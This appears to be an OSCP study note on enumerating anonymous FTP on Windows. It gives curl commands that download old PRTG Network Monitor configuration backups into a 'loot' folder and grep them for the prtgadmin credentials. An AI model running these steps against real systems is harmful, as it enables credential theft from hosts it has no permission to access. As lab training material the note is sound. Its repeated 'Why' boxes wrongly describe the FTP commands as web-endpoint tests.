# Windows - FTP Enumeration

**Windows standalone supplement**

Anonymous FTP can expose more than a normal upload folder. Treat the FTP root as a possible view of the Windows filesystem.

## Run this

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s ftp://$BoxIP/
```

## Example output

```text
ProgramData/
Users/
Windows/
```

## What did you get?

- **Windows paths are visible:** run `dir ProgramData` and `get $Filename` for each interesting file, then inspect the downloads for credentials.
- **Only a small folder is visible:** run `ls`, then run `get $Filename` for each backup, export, or configuration file.

## Run this

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s ftp://$BoxIP/ProgramData/Paessler/PRTG%20Network%20Monitor/
```

## Example output

```text
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak
```

## What did you get?

Download old configuration copies first. Older backups may contain credentials that are absent or changed in the live configuration.

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -o $BoxDir/loot/PRTG_Configuration.old.bak \
  "ftp://$BoxIP/ProgramData/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.old.bak"
curl -s -o $BoxDir/loot/PRTG_Configuration.old \
  "ftp://$BoxIP/ProgramData/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.old"
grep -A 1 "User: prtgadmin" $BoxDir/loot/PRTG_Configuration.old.bak
```

## Gotcha

The FTP listing can make the service look like a normal file share, but paths such as `ProgramData` expose application data from the Windows host. Check old and backup files before spending time on anonymous SMB.

## External Resources

- [HackTricks FTP enumeration](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
## Seen in
- [[OSCP/BOXES/WRITE UPS/Windows/Netmon|Netmon]] -- confirmed in the box write-up

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
